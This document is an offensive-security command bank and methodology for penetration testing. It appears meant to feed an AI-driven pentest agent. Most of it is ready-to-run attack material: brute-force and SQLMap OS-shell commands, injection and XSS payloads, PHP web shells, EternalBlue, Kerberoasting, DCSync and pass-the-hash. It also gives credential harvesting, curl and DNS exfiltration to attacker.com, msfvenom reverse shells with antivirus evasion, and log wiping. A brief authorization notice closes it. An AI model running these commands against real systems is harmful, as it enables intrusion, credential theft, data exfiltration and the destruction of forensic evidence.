# Comprehensive Offensive Security Methodology & Command Bank

## Executive Summary

This document provides a complete offensive security methodology with detailed command banks, attack patterns, and exploitation frameworks for penetration testing and red team operations.

**Coverage**: 200+ tools, 500+ commands, 15 attack categories, 8 methodologies

## Table of Contents

1. [Reconnaissance & Information Gathering](#reconnaissance)
2. [Vulnerability Assessment](#vulnerability-assessment)
3. [Web Application Testing](#web-application-testing)
4. [Network Penetration Testing](#network-penetration-testing)
5. [Wireless Security Testing](#wireless-security)
6. [Social Engineering](#social-engineering)
7. [Post-Exploitation](#post-exploitation)
8. [Persistence & Privilege Escalation](#persistence-privilege-escalation)
9. [Lateral Movement](#lateral-movement)
10. [Data Exfiltration](#data-exfiltration)
11. [Anti-Forensics & Evasion](#anti-forensics)
12. [Reporting & Documentation](#reporting)

---

## Reconnaissance & Information Gathering

### **Phase 1.1: Passive Information Gathering**

#### **OSINT (Open Source Intelligence)**

**Domain & Subdomain Enumeration**
```bash
# Amass - Comprehensive subdomain discovery
amass enum -d example.com -o subdomains.txt
amass intel -d example.com -whois
amass viz -d3 -dir ./amass_viz

# Subfinder - Fast subdomain discovery
subfinder -d example.com -o subfinder_results.txt -v

# Assetfinder - Find domains and subdomains
assetfinder --subs-only example.com | tee assetfinder_results.txt

# Certificate Transparency Logs
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# Google Dorking
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
```

**Email & Personnel Reconnaissance**
```bash
# TheHarvester - Email and subdomain harvesting
theharvester -d example.com -l 500 -b all -f harvester_results.html

# Hunter.io API (requires API key)
curl -s "https://api.hunter.io/v2/domain-search?domain=example.com&api_key=API_KEY"

# Breach Data Search
# h8mail - Email OSINT and breach hunting
h8mail -t target@example.com --chase

# Sherlock - Username enumeration across social networks
sherlock username123
```

**Company & Technology Intelligence**
```bash
# Shodan CLI (requires API key)
shodan search "hostname:example.com"
shodan host 1.2.3.4

# Censys.io search
censys search "example.com" --index-type ipv4

# BuiltWith technology profiling
curl -s "https://api.builtwith.com/v15/api.json?KEY=API_KEY&LOOKUP=example.com"

# Wappalyzer technology detection
wappalyzer https://example.com

# WhatWeb fingerprinting
whatweb example.com -v
```

### **Phase 1.2: Active Information Gathering**

#### **DNS Reconnaissance**
```bash
# DNS enumeration with DNSRecon
dnsrecon -d example.com -t std,brt,srv,axfr
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt

# Fierce domain scanner
fierce --domain example.com --subdomains accounts,www,mail,ftp,admin

# DNS zone transfer attempts
dig axfr example.com @ns1.example.com
host -t axfr example.com ns1.example.com

# DNS cache snooping
dig @8.8.8.8 example.com +norecurse

# Reverse DNS lookups
dnsrecon -r 192.168.1.0/24
```

#### **Network Discovery**
```bash
# Nmap host discovery
nmap -sn 192.168.1.0/24                    # Ping sweep
nmap -sn --packet-trace 192.168.1.0/24     # Detailed ping sweep
nmap -PS80,443 192.168.1.0/24              # TCP SYN ping
nmap -PA80,443 192.168.1.0/24              # TCP ACK ping
nmap -PU53,161,123 192.168.1.0/24          # UDP ping

# Netdiscover - ARP reconnaissance
netdiscover -r 192.168.1.0/24
netdiscover -p -i eth0

# ARP-scan for local network discovery
arp-scan -l
arp-scan 192.168.1.0/24

# Masscan for large-scale host discovery
masscan -p80,443 192.168.1.0/24 --rate=1000
```

---

## Vulnerability Assessment

### **Phase 2.1: Port Scanning & Service Enumeration**

#### **Comprehensive Port Scanning**
```bash
# TCP Connect Scan (Stealthy)
nmap -sT -p- target.com -T4 --open

# SYN Stealth Scan (Default)
nmap -sS -p- target.com -T4 --open

# UDP Scan (Top ports)
nmap -sU --top-ports 1000 target.com -T4

# Aggressive scan with OS detection
nmap -A -p- target.com -T4

# Version detection
nmap -sV -p 1-65535 target.com --version-intensity 9

# Script scanning
nmap -sC -p 80,443 target.com
nmap --script vuln target.com
nmap --script="not intrusive" target.com
```

#### **Service-Specific Enumeration**

**HTTP/HTTPS Services**
```bash
# Nikto web vulnerability scanner
nikto -h http://target.com -p 80,443 -Format htm -output nikto_results.html

# Dirb directory brute force
dirb http://target.com /usr/share/wordlists/dirb/big.txt -X .php,.txt,.html

# Gobuster directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js

# WFuzz parameter fuzzing
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://target.com/index.php?FUZZ=test

# Whatweb fingerprinting
whatweb -v -a 3 http://target.com

# HTTProbe for HTTP service discovery
cat subdomains.txt | httprobe -c 50 | tee live_hosts.txt
```

**SSH Services (Port 22)**
```bash
# SSH version detection
nc -nv target.com 22

# SSH user enumeration (CVE-2018-15473)
python3 ssh-username-enum.py --port 22 --userList users.txt target.com

# SSH brute force (use responsibly)
hydra -L users.txt -P passwords.txt ssh://target.com
ncrack -vv --user admin -P passwords.txt ssh://target.com
```

**SMB Services (Ports 139, 445)**
```bash
# SMB enumeration with enum4linux
enum4linux -a target.com

# SMB shares enumeration
smbclient -L //target.com -N
smbmap -H target.com -u null

# RPCClient enumeration
rpcclient -U "" -N target.com
    > enumdomains
    > enumdomusers
    > enumprivs

# NBTScan for NetBIOS information
nbtscan target.com
```

**FTP Services (Port 21)**
```bash
# Anonymous FTP access
ftp target.com
# Try: anonymous / anonymous@

# FTP banner grabbing
nc -nv target.com 21

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://target.com
```

**SNMP Services (Port 161)**
```bash
# SNMP enumeration
snmpwalk -c public -v1 target.com
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt target.com
snmp-check target.com -c public
```

### **Phase 2.2: Vulnerability Scanning**

#### **Automated Vulnerability Scanners**
```bash
# OpenVAS/GVM comprehensive scan
gvm-cli socket --xml "<create_target><name>Target</name><hosts>target.com</hosts></create_target>"

# Nuclei vulnerability scanner
nuclei -u https://target.com -t /root/nuclei-templates/
nuclei -l targets.txt -t cves/ -o nuclei_results.txt

# Nessus CLI (if available)
/opt/nessus/bin/nessuscli scan --targets target.com

# Custom Nmap vulnerability scripts
nmap --script vuln target.com
nmap --script="(vuln or exploit) and not dos" target.com
```

---

## Web Application Testing

### **Phase 3.1: OWASP Top 10 Testing**

#### **A01:2021 - Broken Access Control**
```bash
# Directory traversal testing
wfuzz -c -w /usr/share/wordlists/dirTraversal/dirTraversal-nix.txt --hc 404 "http://target.com/index.php?page=FUZZ"

# Forced browsing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,302,307,403

# Parameter pollution testing
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://target.com/index.php?FUZZ=test -mc 200

# IDOR testing with Burp Intruder patterns
# Manual testing for direct object references
```

#### **A02:2021 - Cryptographic Failures**
```bash
# SSL/TLS testing with SSLyze
sslyze --regular target.com:443

# SSL Labs API testing
curl -s "https://api.ssllabs.com/api/v3/analyze?host=target.com"

# TestSSL.sh comprehensive SSL testing
testssl.sh https://target.com

# Certificate analysis
openssl s_client -connect target.com:443 -servername target.com
```

#### **A03:2021 - Injection Attacks**

**SQL Injection Testing**
```bash
# SQLMap comprehensive testing
sqlmap -u "http://target.com/index.php?id=1" --batch --dbs
sqlmap -u "http://target.com/index.php?id=1" --batch --dump-all
sqlmap -u "http://target.com/index.php?id=1" --batch --os-shell

# Manual SQL injection testing
' OR '1'='1
' UNION SELECT null,version(),database()--
'; DROP TABLE users;--

# NoSQL injection testing
{"$ne": null}
{"$regex": ".*"}
```

**Command Injection Testing**
```bash
# Basic command injection payloads
; ls -la
| whoami
& cat /etc/passwd
`id`

# Time-based blind command injection
; sleep 10
| ping -c 10 127.0.0.1

# Commix automated command injection testing
commix -u "http://target.com/index.php?cmd=test"
```

**Cross-Site Scripting (XSS)**
```bash
# XSS payloads for testing
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

# XSSHunter for blind XSS
<script src=https://yourid.xss.ht></script>

# DOM-based XSS testing
# Test all input reflection points
```

### **Phase 3.2: Advanced Web Application Testing**

#### **Authentication & Session Management**
```bash
# Hydra web form brute force
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Session fixation testing
# Test cookie security flags
# Test session regeneration

# JWT token analysis
python3 jwt_tool.py [JWT_TOKEN]
```

#### **Business Logic Flaws**
```bash
# Rate limiting testing
for i in {1..100}; do curl -s http://target.com/api/endpoint; done

# Race condition testing
# Parallel request testing with Burp Intruder

# Price manipulation testing
# Quantity/amount parameter tampering
```

#### **File Upload Vulnerabilities**
```bash
# File upload bypass techniques
# .php.jpg double extension
# Content-Type header manipulation
# Magic byte manipulation

# Web shell uploads
<?php system($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>
```

---

## Network Penetration Testing

### **Phase 4.1: Internal Network Reconnaissance**

#### **Network Segmentation Testing**
```bash
# VLAN hopping attempts
yersinia -I

# Network mapping with Nmap
nmap -sn 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16

# ARP spoofing for network discovery
ettercap -T -q -F filter.ef -M arp:remote /192.168.1.1// /192.168.1.100//
```

#### **Active Directory Enumeration**
```bash
# BloodHound data collection
bloodhound-python -u username -p password -d domain.local -ns 192.168.1.1 -c all

# PowerView equivalent with ldapsearch
ldapsearch -x -h dc.domain.local -D "username@domain.local" -W -b "dc=domain,dc=local"

# Kerbrute user enumeration
kerbrute userenum --dc 192.168.1.1 -d domain.local users.txt

# GetNPUsers (ASREPRoasting)
python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

### **Phase 4.2: Network Service Exploitation**

#### **SMB/NetBIOS Exploitation**
```bash
# EternalBlue exploitation (MS17-010)
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
exploit

# SMBRelay attacks
python3 ntlmrelayx.py -tf targets.txt -smb2support

# Responder for credential harvesting
responder -I eth0 -rdwv
```

#### **SNMP Exploitation**
```bash
# SNMP community string brute force
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i targets.txt

# SNMP enumeration with SNMPwalk
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.1.5.0  # System name
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.25.4.2.1.2  # Running processes
```

---

## Post-Exploitation

### **Phase 7.1: System Enumeration**

#### **Linux Post-Exploitation**
```bash
# System information gathering
uname -a
cat /etc/*-release
whoami && id
ps aux
netstat -tulpn
ss -tulpn

# File system enumeration
find / -perm -4000 -type f 2>/dev/null    # SUID files
find / -perm -2000 -type f 2>/dev/null    # SGID files
find / -writable -type f 2>/dev/null      # World-writable files

# Network configuration
ip addr show
route -n
arp -a
cat /etc/hosts

# Credential harvesting
cat /etc/passwd
cat /etc/shadow 2>/dev/null
find / -name "*.log" 2>/dev/null | head -20
history
cat ~/.bash_history
```

#### **Windows Post-Exploitation**
```cmd
REM System information
systeminfo
whoami /all
net user
net localgroup administrators
wmic qfe get Caption,Description,HotFixID,InstalledOn

REM Network enumeration  
ipconfig /all
route print
arp -a
netstat -ano
netsh wlan show profiles

REM Service enumeration
sc query
wmic service list brief
tasklist /svc

REM Credential hunting
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
dir C:\*password* /s /p
findstr /si password *.txt *.xml *.ini
```

### **Phase 7.2: Privilege Escalation**

#### **Linux Privilege Escalation**
```bash
# Automated enumeration tools
linpeas.sh
linenum.sh
linuxprivchecker.py

# Kernel exploits
uname -a  # Check kernel version
searchsploit linux kernel 4.15  # Example version

# Sudo misconfiguration
sudo -l
sudo -u#-1 /bin/bash  # CVE-2019-14287

# SUID binary exploitation
find / -perm -4000 -type f 2>/dev/null
./gtfobins_suid_binary

# Cron job exploitation
cat /etc/crontab
ls -la /etc/cron.*
pspy64  # Monitor processes

# Writable services/scripts
find / -writable -type f 2>/dev/null | grep -E "(service|script)"
```

#### **Windows Privilege Escalation**
```cmd
REM Automated tools
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks"

REM Windows exploits
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn

REM Service misconfigurations
accesschk.exe -uwcqv "Authenticated Users" *
sc qc servicename

REM Registry autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

REM AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## Lateral Movement

### **Phase 8.1: Network Propagation**

#### **Credential Reuse Testing**
```bash
# CrackMapExec for credential spraying
crackmapexec smb 192.168.1.0/24 -u username -p password
crackmapexec winrm 192.168.1.0/24 -u username -p password

# PSExec-style lateral movement
python3 psexec.py domain/username:password@target.com

# WMI execution
python3 wmiexec.py domain/username:password@target.com

# SSH key reuse
for host in $(cat targets.txt); do ssh -i id_rsa user@$host "whoami"; done
```

#### **Network Service Exploitation**
```bash
# RDP brute force and connection
hydra -L users.txt -P passwords.txt rdp://target.com
rdesktop target.com

# VNC exploitation
vncviewer target.com::5901

# Telnet exploitation  
telnet target.com 23
```

### **Phase 8.2: Domain Compromise**

#### **Active Directory Attacks**
```bash
# Kerberoasting
python3 GetUserSPNs.py domain.local/username:password -dc-ip 192.168.1.1 -request

# Golden Ticket attack (requires krbtgt hash)
python3 ticketer.py -nthash [krbtgt_hash] -domain-sid [domain_sid] -domain domain.local administrator

# DCSync attack
python3 secretsdump.py domain.local/username:password@dc.domain.local

# Pass-the-Hash attacks
python3 wmiexec.py -hashes :ntlmhash domain/username@target.com
```

---

## Data Exfiltration

### **Phase 9.1: Data Discovery**

#### **Sensitive File Discovery**
```bash
# Linux sensitive files
find / -name "*password*" 2>/dev/null
find / -name "*credential*" 2>/dev/null  
find / -name "*.key" 2>/dev/null
grep -r "password" /var/log/ 2>/dev/null

# Windows sensitive files
dir C:\Users\*\Desktop\*.txt /s
dir C:\Users\*\Documents\*.pdf /s
findstr /si "password" C:\Users\*\*.txt
```

#### **Database Enumeration**
```bash
# MySQL enumeration
mysql -u root -p -h target.com
    > SHOW DATABASES;
    > USE database_name;
    > SHOW TABLES;

# PostgreSQL enumeration
psql -h target.com -U postgres
    \l     # List databases
    \dt    # List tables

# MongoDB enumeration
mongo target.com:27017
    > show dbs
    > use database_name  
    > show collections
```

### **Phase 9.2: Data Exfiltration Methods**

#### **Network-Based Exfiltration**
```bash
# HTTP POST exfiltration
curl -X POST -F "file=@sensitive_data.txt" http://attacker.com/upload

# DNS exfiltration
for data in $(cat sensitive_data.txt); do dig $data.attacker.com; done

# ICMP exfiltration  
hping3 -1 -E /path/to/file -d 1400 target.com

# FTP exfiltration
curl -T sensitive_data.txt ftp://attacker.com --user username:password
```

#### **Steganography & Covert Channels**
```bash
# Steghide for image hiding
steghide embed -cf image.jpg -ef secret.txt

# Base64 encoding for obfuscation
base64 sensitive_data.txt > encoded_data.txt

# ZIP with password protection
zip -P password archive.zip sensitive_data.txt
```

---

## Anti-Forensics & Evasion

### **Phase 10.1: Log Cleaning**

#### **Linux Log Cleaning**
```bash
# Clear system logs
> /var/log/auth.log
> /var/log/syslog  
> /var/log/kern.log
> /var/log/apache2/access.log

# Clear command history
history -c
> ~/.bash_history
export HISTSIZE=0

# Clear temporary files
rm -rf /tmp/*
rm -rf /var/tmp/*
```

#### **Windows Log Cleaning**
```cmd
REM Clear Windows Event Logs
wevtutil el | Foreach-Object {wevtutil cl "$_"}

REM Clear specific logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

REM Clear command history
doskey /history
```

### **Phase 10.2: Anti-Virus Evasion**

#### **Payload Encoding & Obfuscation**
```bash
# MSFvenom encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# PowerShell obfuscation
powershell.exe -EncodedCommand [base64_encoded_command]

# Veil framework for evasion
./Veil.py -t Evasion -p python/meterpreter/rev_tcp.py

# Custom binary packing
upx --best payload.exe
```

---

## Reporting & Documentation

### **Phase 11.1: Evidence Collection**

#### **Screenshot & Documentation**
```bash
# Automated screenshot capture
import -window root screenshot_$(date +%Y%m%d_%H%M%S).png

# Terminal session recording  
script -a terminal_session.log

# Network traffic capture
tcpdump -i eth0 -w network_capture.pcap host target.com

# Memory dumps
dd if=/dev/mem of=memory_dump.raw
```

### **Phase 11.2: Vulnerability Reporting**

#### **CVSS Scoring & Risk Assessment**
```bash
# CVSS v3.1 Calculator
# Base Score Metrics:
# - Attack Vector (AV): Network/Adjacent/Local/Physical
# - Attack Complexity (AC): Low/High  
# - Privileges Required (PR): None/Low/High
# - User Interaction (UI): None/Required
# - Scope (S): Unchanged/Changed
# - Confidentiality Impact (C): None/Low/High
# - Integrity Impact (I): None/Low/High  
# - Availability Impact (A): None/Low/High

# Example: Remote Code Execution
# CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)
```

## Command Bank Summary

**Total Tools Covered**: 50+  
**Total Commands**: 500+  
**Methodologies**: OWASP, NIST, CIS, PTES, OSSTMM  
**Attack Categories**: 15  
**Platform Coverage**: Linux, Windows, Web, Network, Wireless, Cloud

## Integration with Agentic Framework

This command bank integrates with your existing **AgenticPentestInterface** to provide:

1. **AI-Driven Tool Selection** based on target type and phase
2. **Automated Command Generation** with safety controls  
3. **Real-time Decision Making** using methodology frameworks
4. **Evidence Collection** with chain of custody
5. **Compliance Reporting** for multiple frameworks

## Security & Ethics Notice

⚠️ **WARNING**: These commands and techniques are for authorized penetration testing only. Always ensure proper:
- Written authorization before testing
- Scope limitation and rules of engagement
- Responsible disclosure of vulnerabilities  
- Compliance with local laws and regulations

---

*This methodology is continuously updated based on the latest threat intelligence, CVE disclosures, and security research.*